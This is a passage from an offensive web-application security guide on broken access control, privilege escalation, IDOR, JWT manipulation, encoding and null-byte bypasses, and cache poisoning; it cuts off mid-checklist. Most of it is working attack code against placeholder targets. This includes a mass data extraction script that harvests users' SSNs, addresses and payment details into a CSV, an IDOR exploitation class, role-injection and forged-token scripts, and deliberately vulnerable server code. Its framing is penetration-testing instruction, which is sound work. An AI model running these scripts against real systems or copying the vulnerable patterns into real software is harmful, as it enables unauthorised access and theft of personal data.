    print(f"[*] Analyzing session: {session_cookie[:50]}...")
    
    # Check if session is server-side reference
    if len(session_cookie) < 50 and session_cookie.isalnum():
        analysis['storage_type'] = 'server_side_reference'
        print("[+] Session appears to be server-side reference (secure)")
    
    # Check if session contains serialized data
    try:
        import base64
        decoded = base64.b64decode(session_cookie)
        
        if b'{' in decoded or b'"' in decoded:
            analysis['storage_type'] = 'client_side_json'
            analysis['contains_sensitive_data'] = True
            print("[!] Session contains client-side data (JSON)")
            
            # Try to parse
            import json
            try:
                data = json.loads(decoded)
                print(f"[!] Decoded session data: {json.dumps(data, indent=2)}")
                
                # Check for sensitive fields
                sensitive_keys = ['password', 'ssn', 'credit_card', 'secret', 'key']
                for key in data:
                    if any(s in key.lower() for s in sensitive_keys):
                        analysis['vulnerabilities'].append(
                            f"Sensitive field in session: {key}"
                        )
            except:
                pass
    except:
        pass
    
    # Check for signature
    if '.' in session_cookie or '|' in session_cookie or ':' in session_cookie:
        analysis['is_signed'] = True
        print("[*] Session appears to be signed")
    
    # Check encryption
    if len(set(session_cookie)) > 50:  # High entropy
        analysis['is_encrypted'] = True
        print("[*] Session may be encrypted (high entropy)")
    
    return analysis

# Example
# session = "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=="
# analyze_session_storage(session)
```

---

**Important Related Topics:**

- OAuth 2.0 and OIDC authentication flows exploitation
- SAML assertion manipulation
- Multi-factor authentication bypass techniques
- Password reset token vulnerabilities

---

## Authorization & Access Control

### Broken Access Control Exploitation

Broken access control vulnerabilities occur when an application fails to properly enforce authorization policies, allowing users to access resources or perform actions beyond their intended permissions. These vulnerabilities represent OWASP Top 10 #1 across most assessment categories.

#### Access Control Model Analysis

Identify the application's authorization model by examining resource hierarchy and permission structure. Common models include:

Role-Based Access Control (RBAC): Permissions assigned to roles, users inherit role permissions.

```java
// VULNERABLE: Insufficient role checking
@PostMapping("/admin/delete_user")
public String deleteUser(@RequestParam int userId) {
    User currentUser = getCurrentUser();
    
    // Only checks if user has ANY admin role
    if (currentUser.getRole().contains("admin")) {
        userRepository.delete(userId);
        return "User deleted";
    }
    return "Unauthorized";
}

// Attack: User with admin_viewer role (contains "admin" string) bypasses check
```

Attribute-Based Access Control (ABAC): Fine-grained permissions based on attributes (user, resource, action, environment).

```python
# VULNERABLE: Incomplete attribute checking
def delete_document(user_id, document_id):
    doc = Document.query.get(document_id)
    user = User.query.get(user_id)
    
    # Only checks user department equals document department
    if user.department == doc.department:
        doc.delete()
        return "Document deleted"
    
    # Missing check: user must be owner or manager
    return "Forbidden"
```

#### Exploit Missing Access Control Checks

Direct resource access without authorization verification:

```python
# VULNERABLE: No authorization check
@app.route('/api/files/<file_id>')
def download_file(file_id):
    file = File.query.get(file_id)
    return send_file(file.path)  # No user permission check

# Attack: Any authenticated user can download any file
# http://target.com/api/files/1 - downloads file owned by another user
```

Exploitation via URL manipulation:

```bash
# Access resources by modifying URL parameters
http://target.com/user/1/profile         # Own profile
http://target.com/user/2/profile         # Another user's profile (unauthorized)
http://target.com/admin/settings         # Admin settings
http://target.com/report/2024/financials # Sensitive report
```

#### Exploiting Missing Function-Level Access Control

Functions or API endpoints with insufficient authorization:

```java
// VULNERABLE: Function lacks authorization check
@PostMapping("/api/promote_user")
public String promoteUser(@RequestParam int userId) {
    // No check if current user is administrator
    User targetUser = userRepository.findById(userId);
    targetUser.setRole("ADMIN");
    userRepository.save(targetUser);
    return "User promoted";
}

// Attack: Non-admin user sends request to promote themselves
// curl -X POST "http://target.com/api/promote_user?userId=123"
```

Automated function enumeration and access testing:

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urljoin

def enumerate_api_endpoints(target_base_url, endpoints_file):
    """Test API endpoints for broken access control"""
    
    with open(endpoints_file, 'r') as f:
        endpoints = [line.strip() for line in f if line.strip()]
    
    vulnerable = []
    
    for endpoint in endpoints:
        url = urljoin(target_base_url, endpoint)
        
        # Test without authentication
        r_anon = requests.get(url, verify=False)
        
        # Test with low-privilege user
        r_user = requests.get(url, auth=('user', 'password'), verify=False)
        
        # Test with admin
        r_admin = requests.get(url, auth=('admin', 'password'), verify=False)
        
        print(f"[*] {endpoint}")
        print(f"    Anonymous: {r_anon.status_code}")
        print(f"    User: {r_user.status_code}")
        print(f"    Admin: {r_admin.status_code}")
        
        # Flag suspicious patterns
        if r_anon.status_code in [200, 201]:
            print(f"    [!] VULNERABLE: Accessible without authentication")
            vulnerable.append((endpoint, "No auth required"))
        
        if r_user.status_code == 200 and r_admin.status_code == 200:
            if "admin" in endpoint.lower():
                print(f"    [!] VULNERABLE: Admin endpoint accessible by user")
                vulnerable.append((endpoint, "No privilege check"))
    
    return vulnerable

vulnerable_endpoints = enumerate_api_endpoints("http://target.com", "endpoints.txt")
```

#### Path Traversal in Access Control

Bypass directory-level access controls:

```bash
# Restricted path
http://target.com/user/documents/  # User can access own documents

# Path traversal bypasses ownership check
http://target.com/user/documents/../../admin/secrets.pdf
http://target.com/user/documents/..%2F..%2Fadmin%2Fsecrets.pdf
http://target.com/user/documents/%2e%2e%2fadmin%2fsecrets.pdf
```

#### Testing for Broken Access Control

Systematic testing methodology:

```python
#!/usr/bin/env python3
import requests
import json

def test_broken_access_control(target_url, test_cases):
    """Comprehensive broken access control testing"""
    
    session = requests.Session()
    results = []
    
    for test_name, method, endpoint, auth_user, expected_status in test_cases:
        url = f"{target_url}{endpoint}"
        
        # Test with specified user
        if auth_user:
            response = session.request(method, url, auth=auth_user)
        else:
            response = session.request(method, url)
        
        status = response.status_code
        is_vulnerable = status != expected_status
        
        result = {
            'test': test_name,
            'endpoint': endpoint,
            'status': status,
            'expected': expected_status,
            'vulnerable': is_vulnerable
        }
        
        results.append(result)
        
        if is_vulnerable:
            print(f"[!] VULNERABLE: {test_name}")
            print(f"    Expected: {expected_status}, Got: {status}")
        else:
            print(f"[+] OK: {test_name}")
    
    return results

# Test cases: (name, method, endpoint, auth, expected_status)
test_cases = [
    ("Unauthenticated admin access", "GET", "/admin", None, 401),
    ("User accessing another user's data", "GET", "/api/user/123", ("user", "pass"), 403),
    ("Non-admin user promoting self", "POST", "/api/promote", ("user", "pass"), 403),
    ("Public file accessible", "GET", "/public/file.txt", None, 200),
]

test_broken_access_control("http://target.com", test_cases)
```

### Horizontal Privilege Escalation

Horizontal privilege escalation allows a user to access resources or perform actions belonging to another user with the same privilege level (peer access violation).

#### User ID Parameter Manipulation

Access another user's data by modifying user ID:

```python
# VULNERABLE: No ownership verification
def get_user_profile(user_id):
    user = User.query.get(user_id)
    return jsonify(user.to_dict())

# Attack sequence:
# 1. Authenticate as user_id=100
# 2. Request GET /api/user/101 (another user's data)
# 3. Application returns user_id=101 profile without ownership check
```

Exploitation script:

```python
#!/usr/bin/env python3
import requests

def horizontal_escalation_user_id(target_url, authenticated_user_id):
    """Attempt horizontal escalation via user ID manipulation"""
    
    session = requests.Session()
    
    # Authenticate as known user
    session.post(f"{target_url}/login", data={
        'username': 'victim',
        'password': 'password'
    })
    
    # Attempt to access other users' data
    for other_id in range(1, 50):
        if other_id == authenticated_user_id:
            continue
        
        response = session.get(f"{target_url}/api/user/{other_id}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Accessed user {other_id}:")
            print(f"    Email: {data.get('email')}")
            print(f"    Phone: {data.get('phone')}")
            print(f"    Address: {data.get('address')}")
            
            # Additional sensitive endpoints
            sensitive = [
                f"/api/user/{other_id}/settings",
                f"/api/user/{other_id}/orders",
                f"/api/user/{other_id}/payments",
                f"/api/user/{other_id}/messages"
            ]
            
            for endpoint in sensitive:
                r = session.get(f"{target_url}{endpoint}")
                if r.status_code == 200:
                    print(f"    [!] Accessible: {endpoint}")
```

#### Account Enumeration and Mass Data Access

Combine horizontal escalation with enumeration:

```python
#!/usr/bin/env python3
import requests
import csv

def mass_data_extraction(target_url, id_range, output_file):
    """Extract data from multiple users via horizontal escalation"""
    
    session = requests.Session()
    session.post(f"{target_url}/login", data={
        'username': 'attacker',
        'password': 'password'
    })
    
    extracted_data = []
    
    for user_id in range(id_range[0], id_range[1]):
        try:
            response = session.get(f"{target_url}/api/user/{user_id}")
            
            if response.status_code == 200:
                user_data = response.json()
                
                # Extract sensitive fields
                record = {
                    'user_id': user_id,
                    'email': user_data.get('email'),
                    'phone': user_data.get('phone'),
                    'ssn': user_data.get('ssn'),
                    'address': user_data.get('address'),
                    'payment_method': user_data.get('payment_method')
                }
                
                extracted_data.append(record)
                print(f"[+] Extracted user {user_id}")
        
        except Exception as e:
            print(f"[-] Error extracting user {user_id}: {e}")
    
    # Export to CSV
    if extracted_data:
        with open(output_file, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=extracted_data[0].keys())
            writer.writeheader()
            writer.writerows(extracted_data)
        
        print(f"\n[+] Extracted {len(extracted_data)} user records")
        print(f"[+] Saved to {output_file}")
    
    return extracted_data

mass_data_extraction("http://target.com", (1, 1000), "extracted_users.csv")
```

#### Reference ID Manipulation

Modify object references beyond ownership:

```javascript
// VULNERABLE: No reference validation
app.post('/api/order/:order_id/ship', (req, res) => {
    const order = Order.findById(req.params.order_id);
    
    // Missing check: current user is order owner/manager
    order.status = 'shipped';
    order.save();
    
    res.json({status: 'Order shipped'});
});

// Attack: Ship another company's order
// POST /api/order/9999/ship
```

Exploit via UUID or GUID if predictable:

```python
import uuid

def test_uuid_predictability(target_url):
    """Test if UUIDs are sequential/predictable"""
    
    # Retrieve own object UUID
    r1 = requests.get(f"{target_url}/api/object/mine")
    my_uuid = r1.json()['id']
    
    print(f"[*] My UUID: {my_uuid}")
    
    # Attempt to access nearby UUIDs
    # If sequential, others' data may be accessible
    int_val = int(my_uuid.replace('-', ''), 16)
    
    for offset in range(-5, 5):
        test_uuid = format(int_val + offset, '032x')
        test_uuid = f"{test_uuid[:8]}-{test_uuid[8:12]}-{test_uuid[12:16]}-{test_uuid[16:20]}-{test_uuid[20:]}"
        
        r = requests.get(f"{target_url}/api/object/{test_uuid}")
        
        if r.status_code == 200:
            print(f"[+] Found object: {test_uuid}")
            print(r.json())
```

### Vertical Privilege Escalation

Vertical privilege escalation allows a user to gain higher privileges (e.g., user to admin) or access privileged functions.

#### Role Manipulation via User Input

Modify role in request parameters:

```python
# VULNERABLE: Role parameter in request
@app.route('/api/user/register', methods=['POST'])
def register():
    username = request.form.get('username')
    password = request.form.get('password')
    role = request.form.get('role')  # DANGEROUS: User-supplied role
    
    user = User(username=username, password=hash(password), role=role)
    db.session.add(user)
    db.session.commit()
    
    return jsonify({'status': 'registered', 'role': user.role})

# Attack: Register as admin
# POST /api/user/register
# username=attacker&password=secret&role=admin
```

Exploitation script:

```python
#!/usr/bin/env python3
import requests

def privilege_escalation_role_injection(target_url):
    """Exploit role parameter injection"""
    
    # Register with admin role
    data = {
        'username': 'attacker',
        'password': 'password123',
        'role': 'admin'
    }
    
    response = requests.post(f"{target_url}/api/user/register", data=data)
    
    print(f"[*] Registration response: {response.json()}")
    
    if 'admin' in str(response.json()).lower():
        print(f"[+] Successfully registered as admin")
        
        # Login and verify privileges
        login_data = {
            'username': 'attacker',
            'password': 'password123'
        }
        
        r = requests.post(f"{target_url}/login", data=login_data)
        
        # Test admin functionality
        admin_response = requests.get(f"{target_url}/admin/users")
        
        if admin_response.status_code == 200:
            print(f"[+] Admin access confirmed")
            print(admin_response.json())
```

#### Privilege Escalation via Token Manipulation

Modify JWT or session token claims:

```python
import jwt
import json
import base64

def escalate_via_jwt_manipulation(original_token, secret_key):
    """Modify JWT claims to escalate privileges"""
    
    # Decode JWT (without verification if secret unknown)
    parts = original_token.split('.')
    
    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    print(f"[*] Header: {header}")
    
    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    print(f"[*] Original payload: {payload}")
    
    # Modify payload
    payload['role'] = 'admin'
    payload['privileges'] = ['read', 'write', 'delete', 'manage_users']
    
    # Re-encode (if secret is known or weak)
    if secret_key:
        new_token = jwt.encode(payload, secret_key, algorithm='HS256')
        print(f"[+] New token: {new_token}")
        return new_token
    else:
        # If signature verification is disabled
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        new_token = f"{parts[0]}.{new_payload}.{parts[2]}"
        print(f"[+] Unsigned token: {new_token}")
        return new_token

# Test JWT escalation
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoidXNlciJ9.signature"
escalate_via_jwt_manipulation(token, "secret_key")
```

#### API Key and Token Privilege Levels

Discover higher-privilege API keys:

```python
#!/usr/bin/env python3
import requests

def enumerate_api_keys(target_url, base_key):
    """Attempt to discover higher-privilege API keys"""
    
    # Enumerate sequential API keys
    key_patterns = [
        base_key.replace('0', '1'),  # Increment numeric portion
        base_key.replace(base_key[-1], chr(ord(base_key[-1])+1)),  # Next character
        f"admin_{base_key}",
        f"root_{base_key}",
        base_key + "_admin"
    ]
    
    for test_key in key_patterns:
        headers = {'X-API-Key': test_key}
        
        # Test admin endpoint
        response = requests.get(f"{target_url}/admin/dashboard", headers=headers)
        
        print(f"[*] Testing key: {test_key}")
        print(f"    Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[+] FOUND: Higher-privilege API key: {test_key}")
            return test_key
    
    return None
```

#### Exploitation of Insufficient Authorization Checks

Missing authorization in state-changing operations:

```python
# VULNERABLE: No role check on admin function
@app.route('/admin/delete_user/<user_id>', methods=['DELETE'])
def delete_user_admin(user_id):
    # Missing: if not is_admin(current_user): return 403
    
    user = User.query.get(user_id)
    db.session.delete(user)
    db.session.commit()
    
    return jsonify({'status': 'deleted'})

# Attack: Regular user sends DELETE request to delete other users
# DELETE /admin/delete_user/123
```

Automated privilege escalation testing:

```python
#!/usr/bin/env python3
import requests

def test_vertical_escalation(target_url, low_priv_user, admin_endpoints):
    """Test if low-privilege user can access admin functions"""
    
    session = requests.Session()
    
    # Authenticate as low-privilege user
    session.post(f"{target_url}/login", data={
        'username': low_priv_user['username'],
        'password': low_priv_user['password']
    })
    
    vulnerable = []
    
    for endpoint in admin_endpoints:
        # Test GET
        r_get = session.get(f"{target_url}{endpoint}")
        if r_get.status_code == 200:
            print(f"[!] GET {endpoint}: {r_get.status_code} (VULNERABLE)")
            vulnerable.append((endpoint, 'GET', r_get.status_code))
        
        # Test POST (data modification)
        r_post = session.post(f"{target_url}{endpoint}", data={'action': 'test'})
        if r_post.status_code in [200, 201]:
            print(f"[!] POST {endpoint}: {r_post.status_code} (VULNERABLE)")
            vulnerable.append((endpoint, 'POST', r_post.status_code))
        
        # Test DELETE
        r_delete = session.delete(f"{target_url}{endpoint}")
        if r_delete.status_code in [200, 204]:
            print(f"[!] DELETE {endpoint}: {r_delete.status_code} (VULNERABLE)")
            vulnerable.append((endpoint, 'DELETE', r_delete.status_code))
    
    return vulnerable

admin_endpoints = [
    '/admin/users',
    '/admin/settings',
    '/admin/logs',
    '/api/admin/configuration',
    '/dashboard/admin'
]

test_vertical_escalation("http://target.com", 
                        {'username': 'user', 'password': 'pass'},
                        admin_endpoints)
```

### IDOR (Insecure Direct Object References)

IDOR vulnerabilities occur when an application uses user-supplied input to directly access objects without proper authorization checks, allowing attackers to access unauthorized resources.

#### IDOR in REST APIs

Common IDOR patterns in API endpoints:

```python
# Pattern 1: User ID in URL
# VULNERABLE: /api/user/123/profile - user 123's data accessible without ownership check
GET /api/user/123/profile         # Attacker accesses user 123's data
GET /api/user/124/profile         # Attacker accesses user 124's data
GET /api/user/125/settings        # Attacker accesses user 125's settings

# Pattern 2: Predictable resource ID
# /api/invoice/1001 - invoice 1001
# /api/invoice/1002 - invoice 1002
# VULNERABLE: Sequential IDs allow enumeration and access

# Pattern 3: Hidden parameters
# /download?file_id=1&user_id=100 - attacker modifies user_id
```

IDOR exploitation framework:

```python
#!/usr/bin/env python3
import requests
import json
from concurrent.futures import ThreadPoolExecutor

class IDORExploiter:
    def __init__(self, target_url, session_cookie=None):
        self.target_url = target_url
        self.session = requests.Session()
        
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
    
    def test_numeric_idor(self, endpoint_template, id_range):
        """Test IDOR with numeric sequential IDs"""
        
        vulnerable_ids = []
        
        def test_id(test_id):
            endpoint = endpoint_template.replace('{id}', str(test_id))
            url = f"{self.target_url}{endpoint}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code == 200:
                    return test_id, response
            except:
                pass
            
            return None, None
        
        # Parallel testing
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(test_id, i) for i in id_range]
            
            for future in futures:
                test_id, response = future.result()
                if test_id is not None:
                    print(f"[+] IDOR found at ID {test_id}")
                    vulnerable_ids.append({
                        'id': test_id,
                        'response': response.json() if response.headers.get('content-type') == 'application/json' else response.text
                    })
        
        return vulnerable_ids
    
    def test_uuid_idor(self, endpoint_template, known_uuid, mutation_count=100):
        """Test IDOR with UUID-based IDs"""
        
        vulnerable_uuids = []
        
        # If UUID is sequential/predictable
        int_val = int(known_uuid.replace('-', ''), 16)
        
        for offset in range(-mutation_count, mutation_count):
            test_int = int_val + offset
            test_uuid = format(test_int, '032x')
            test_uuid = f"{test_uuid[:8]}-{test_uuid[8:12]}-{test_uuid[12:16]}-{test_uuid[16:20]}-{test_uuid[20:]}"
            
            endpoint = endpoint_template.replace('{uuid}', test_uuid)
            url = f"{self.target_url}{endpoint}"
            
            response = self.session.get(url)
            
            if response.status_code == 200 and test_uuid != known_uuid:
                print(f"[+] IDOR found at UUID {test_uuid}")
                vulnerable_uuids.append(test_uuid)
        
        return vulnerable_uuids
    
    def test_parameter_idor(self, endpoint, param_name, value_range):
        """Test IDOR via parameter manipulation"""
        
        vulnerable_values = []
        
        for value in value_range:
            params = {param_name: value}
            
            response = self.session.get(f"{self.target_url}{endpoint}", params=params)
            
            if response.status_code == 200:
                print(f"[+] IDOR found with {param_name}={value}")
                vulnerable_values.append(value)
        
        return vulnerable_values
    
    def extract_data_via_idor(self, endpoint_template, id_range, extract_fields=None):
        """Extract sensitive data using IDOR"""
        
        extracted_data = []
        
        for test_id in id_range:
            endpoint = endpoint_template.replace('{id}', str(test_id))
            url = f"{self.target_url}{endpoint}"
            
            response = self.session.get(url)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    if extract_fields:
                        filtered = {k: v for k, v in data.items() if k in extract_fields}
                    else:
                        filtered = data
                    
                    extracted_data.append({
                        'id': test_id,
                        'data': filtered
                    })
                    
                    print(f"[+] Extracted data for ID {test_id}")
                
                except json.JSONDecodeError:
                    pass
        
        return extracted_data

# Usage
exploiter = IDORExploiter("http://target.com", session_cookie="session_value")

# Test numeric IDOR
numeric_results = exploiter.test_numeric_idor("/api/user/{id}/profile", range(1, 100))

# Test parameter IDOR
param_results = exploiter.test_parameter_idor("/api/data", "user_id", range(1, 50))

# Extract data via IDOR
data = exploiter.extract_data_via_idor(
    "/api/user/{id}/orders",
    range(1, 200),
    extract_fields=['order_id', 'amount', 'items', 'shipping_address']
)
```

#### IDOR in File Operations

Access unauthorized files via IDOR:

```python
# VULNERABLE: /download?file_id=1
# File ID directly corresponds to filesystem or database record

def idor_file_enumeration(target_url, file_id_range):
    """Enumerate accessible files via IDOR"""
    
    accessible_files = []
    
    for file_id in file_id_range:
        url = f"{target_url}/download?file_id={file_id}"
        
        response = requests.get(url)
        
        if response.status_code == 200:
            # Check if actual file content returned
            if len(response.content) > 0 and response.headers.get('content-disposition'):
                filename = response.headers.get('content-disposition', '').split('=')[-1]
                
                print(f"[+] Accessible file: {filename} (ID: {file_id})")
                
                accessible_files.append({
                    'file_id': file_id,
                    'filename': filename,
                    'size': len(response.content),
                    'content_type': response.headers.get('content-type')
                })
                
                # Save file for analysis
                with open(f"extracted_{file_id}_{filename}", 'wb') as f:
                    f.write(response.content)
    
    return accessible_files
```

#### IDOR in API Endpoints with Multiple Parameters

Complex IDOR scenarios with multiple identifiers:

```python
# VULNERABLE: /api/company/{company_id}/user/{user_id}/data
# Attacker can modify company_id or user_id

def idor_multi_parameter(target_url, company_id_range, user_id_range):
    """Test IDOR across multiple parameters"""
    
    vulnerable_combinations = []
    
    for company_id in company_id_range:
        for user_id in user_id_range:
            url = f"{target_url}/api/company/{company_id}/user/{user_id}/data"
            
            response = requests.get(url)
            
            if response.status_code == 200:
                print(f"[+] Accessible: company={company_id}, user={user_id}")
                vulnerable_combinations.append({
                    'company_id': company_id,
                    'user_id': user_id,
                    'data': response.json()
                })
    
    return vulnerable_combinations
```

#### Combining IDOR with Other Vulnerabilities

IDOR combined with mass assignment:

```python
# VULNERABLE: IDOR + Mass Assignment
# Attacker can modify another user's data via IDOR and parameter injection

def idor_mass_assignment(target_url, target_user_id):
    """Exploit IDOR with mass assignment to modify other user's data"""
    
    data = {
        'user_id': target_user_id,
        'role': 'admin',
        'is_verified': True,
        'email_verified': True,
        'premium_user': True
    }
    
    url = f"{target_url}/api/user/{target_user_id}/profile"
    
    response = requests.post(url, json=data)
    
    if response.status_code in [200, 204]:
        print(f"[+] Successfully modified user {target_user_id}")
        print(f"[+] Payload: {data}")
        
        # Verify changes
        get_response = requests.get(url)
        print(f"[+] Updated profile: {get_response.json()}")
        
        return True
    
    return False
```

#### IDOR Detection and Remediation

Systematic IDOR testing methodology:

```python
#!/usr/bin/env python3
import requests

def comprehensive_idor_test(target_url, endpoints, authenticated_user_id):
    """Comprehensive IDOR testing framework"""
    
    session = requests.Session()
    session.auth = ('user', 'password')
    
    findings = {
        'vulnerable': [],
        'secure': []
    }
    
    for endpoint in endpoints:
        print(f"\n[*] Testing: {endpoint}")
        
        # Test with own ID
        own_endpoint = endpoint.replace('{id}', str(authenticated_user_id))
        r_own = session.get(f"{target_url}{own_endpoint}")
        
        if r_own.status_code != 200:
            print(f"[-] Endpoint inaccessible")
            continue
        
        # Test with different IDs
        for other_id in range(1, 10):
            if other_id == authenticated_user_id:
                continue
            
            other_endpoint = endpoint.replace('{id}', str(other_id))
            r_other = session.get(f"{target_url}{other_endpoint}")
            
            if r_other.status_code == 200:
                print(f"[!] VULNERABLE: User {authenticated_user_id} can access user {other_id}")
                findings['vulnerable'].append({
                    'endpoint': endpoint,
                    'own_id': authenticated_user_id,
                    'accessed_id': other_id
                })
            else:
                findings['secure'].append(endpoint)
    
    return findings

endpoints = [
    '/api/user/{id}/profile',
    '/api/user/{id}/orders',
    '/api/user/{id}/payments',
    '/api/account/{id}/settings',
]

idor_findings = comprehensive_idor_test("http://target.com", endpoints, 100)
```

### Access Control Bypass via HTTP Method Manipulation

HTTP method override vulnerabilities allow bypassing authorization checks:

```python
# VULNERABLE: Different authorization checks for different methods
@app.route('/api/admin/settings', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE'])
def admin_settings():
    # Only checks authorization for GET
    if request.method == 'GET':
        if not is_admin():
            return 403
    
    # POST/PUT/PATCH/DELETE lack authorization checks
    if request.method == 'POST':
        update_settings(request.json)
        return 200

# Attack: Use POST instead of GET to bypass authorization
curl -X POST http://target.com/api/admin/settings -d '{"setting":"value"}'
```

Automated HTTP method testing:

```python
#!/usr/bin/env python3
import requests

def test_http_method_bypass(target_url, endpoint, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']):
    """Test if different HTTP methods bypass authorization"""
    
    session = requests.Session()
    session.auth = ('user', 'password')  # Non-admin user
    
    print(f"[*] Testing HTTP method bypass on {endpoint}")
    
    for method in methods:
        try:
            if method == 'GET':
                response = session.get(f"{target_url}{endpoint}")
            elif method == 'POST':
                response = session.post(f"{target_url}{endpoint}", data={'test': 'data'})
            elif method == 'PUT':
                response = session.put(f"{target_url}{endpoint}", json={'test': 'data'})
            elif method == 'DELETE':
                response = session.delete(f"{target_url}{endpoint}")
            elif method == 'PATCH':
                response = session.patch(f"{target_url}{endpoint}", json={'test': 'data'})
            elif method == 'HEAD':
                response = session.head(f"{target_url}{endpoint}")
            elif method == 'OPTIONS':
                response = session.options(f"{target_url}{endpoint}")
            
            print(f"[*] {method}: {response.status_code}")
            
            if response.status_code in [200, 201, 204]:
                print(f"[!] VULNERABLE: {method} bypasses authorization")
        
        except Exception as e:
            print(f"[-] Error testing {method}: {e}")
```

### Case Sensitivity and Encoding Bypass

Bypass access controls through case manipulation and encoding:

```python
# VULNERABLE: Case-sensitive authorization checks
protected_paths = ['/admin', '/ADMIN', '/Admin']

@app.route('/<path:path>')
def access_control(path):
    if path.lower() == 'admin':  # Lowercase comparison
        if not is_admin():
            return 403
    
    return serve_page(path)

# Attack: Use alternate casing
# /ADMIN - bypasses check if comparison not done correctly
# /Admin
# /aDmIn
```

Encoding bypass techniques:

```bash
# URL encoding
/admin          → /%61dmin (hex encoding of 'a')
/admin          → /%2e%2e/admin (path traversal encoding)

# Double encoding
/admin          → /%252e%252e/admin

# Unicode encoding
/admin          → /ａｄｍｉｎ (fullwidth unicode characters)
```

Testing encoding bypasses:

```python
#!/usr/bin/env python3
import requests
import urllib.parse

def test_encoding_bypass(target_url, protected_endpoint):
    """Test authorization bypass via encoding"""
    
    encodings = {
        'original': protected_endpoint,
        'url_encoded': urllib.parse.quote(protected_endpoint),
        'double_encoded': urllib.parse.quote(urllib.parse.quote(protected_endpoint)),
        'hex_encoded': ''.join(f'%{ord(c):02x}' if c.isalpha() else c for c in protected_endpoint),
        'unicode_fullwidth': protected_endpoint.translate(str.maketrans(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
            'ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ'
        ))
    }
    
    for encoding_name, encoded_path in encodings.items():
        url = f"{target_url}{encoded_path}"
        
        try:
            response = requests.get(url)
            
            print(f"[*] {encoding_name}: {response.status_code}")
            
            if response.status_code == 200 and 'admin' in response.text.lower():
                print(f"[!] BYPASS FOUND via {encoding_name}")
                print(f"[!] URL: {url}")
        
        except Exception as e:
            print(f"[-] Error testing {encoding_name}: {e}")
```

### Null Byte Injection in Access Control

Null byte injection can bypass filename restrictions and access controls:

```python
# VULNERABLE: Filename filtering before null byte
allowed_extensions = ['.txt', '.pdf', '.doc']

def upload_file(filename):
    # Check extension
    if not any(filename.endswith(ext) for ext in allowed_extensions):
        return "Invalid file type"
    
    # Null byte bypasses extension check
    save_to_disk(filename)  # filename: "malicious.php%00.txt" → "malicious.php"

# Attack: Upload "webshell.php%00.txt"
# File saved as "webshell.php" due to null byte truncation
```

Null byte bypass in URL paths:

```bash
# Bypass access control on specific path
/admin/settings%00/public        # Treated as /admin/settings (null byte truncates)
/secure/data.php%00.txt          # Interpreted as /secure/data.php

# Test null byte bypass
curl "http://target.com/admin/dashboard%00/public"
```

### Privilege Escalation via Cache Poisoning

Exploit caching to serve admin content to other users:

```python
# VULNERABLE: Authorization check before caching
@app.route('/api/admin/report')
def admin_report():
    if is_admin():
        report = generate_admin_report()
        response = make_response(report)
        response.cache_control.max_age = 3600  # Cache for 1 hour
        return response
    
    return "Unauthorized", 403

# Attack:
# 1. Admin requests /api/admin/report (cached)
# 2. Non-admin requests same URL (receives cached admin report)
# 3. Cache serves admin content to non-admin user
```

Cache poisoning exploitation:

```python
#!/usr/bin/env python3
import requests
import time

def exploit_cache_poisoning(target_url, admin_endpoint):
    """Exploit cache poisoning to bypass authorization"""
    
    # Step 1: Admin accesses endpoint (gets cached)
    admin_session = requests.Session()
    admin_session.auth = ('admin', 'admin_password')
    
    r_admin = admin_session.get(f"{target_url}{admin_endpoint}")
    print(f"[*] Admin request status: {r_admin.status_code}")
    print(f"[*] Cache headers: {r_admin.headers.get('cache-control')}")
    
    # Step 2: Non-admin requests same endpoint (receives cache)
    user_session = requests.Session()
    user_session.auth = ('user', 'user_password')
    
    r_user = user_session.get(f"{target_url}{admin_endpoint}")
    
    if r_user.status_code == 200 and r_user.text == r_admin.text:
        print(f"[!] VULNERABLE: Cache served admin content to non-admin user")
        print(f"[!] Content preview: {r_user.text[:500]}")
        return True
    
    return False
```

### Exploiting Loose Authorization Checks

Authorization checks that use contains() or string matching vulnerabilities:

```java
// VULNERABLE: Loose role checking
if (userRole.contains("admin")) {
    // Grant admin access
}

// "user_admin", "admin_user", "administrator" all contain "admin"
```

Exploitation:

```python
def bypass_via_string_matching(target_url, user_with_admin_in_role):
    """Bypass loose authorization checks"""
    
    # User has role "poweruser_admin" (contains "admin")
    session = requests.Session()
    session.auth = (user_with_admin_in_role, 'password')
    
    admin_endpoints = [
        '/admin/users',
        '/admin/settings',
        '/admin/logs',
        '/administrator/dashboard'
    ]
    
    for endpoint in admin_endpoints:
        r = session.get(f"{target_url}{endpoint}")
        
        if r.status_code == 200:
            print(f"[+] Accessed admin function: {endpoint}")
```

### Authorization Testing Tools and Methodologies

Burp Suite for authorization testing:

```bash
# Use Burp Suite Intruder for authorization bypass testing
# 1. Capture authenticated request
# 2. Modify user ID/reference parameter
# 3. Send request and compare responses
# 4. Identify inconsistencies indicating authorization bypass
```

Manual testing checklist:

```markdown
Authorization Testing Checklist:

1. Horizontal Escalation:
   - Modify user IDs in URLs/parameters
   - Attempt to access other users' data
   - Test with sequential IDs (1, 2, 3...)
   - Test with UUID-based IDs

2. Vertical Escalation:
   - Modify role/privilege parameters
   - Test admin endpoints with low-privilege user
   - Attempt role injection in POST requests
   - Test JWT/token manipulation

3. IDOR Detection:
   - Map all endpoints with object references
   - Test with different user accounts
   - Document accessible objects per user
   - Attempt mass data extraction

4. Broken Access Control:
   - Test all HTTP methods (GET, POST, PUT, DELETE)
